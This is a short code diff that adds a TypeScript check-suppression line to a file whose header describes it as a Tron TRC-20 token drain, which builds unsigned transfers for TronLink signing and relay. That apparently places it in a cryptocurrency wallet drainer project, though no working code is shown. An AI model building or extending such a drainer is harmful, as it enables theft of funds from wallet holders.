@@ -1,3 +1,4 @@
+// @ts-nocheck
 /**
  * Tron TRC-20 token drain — unsigned smart-contract transfer for TronLink signing + relay.
  */
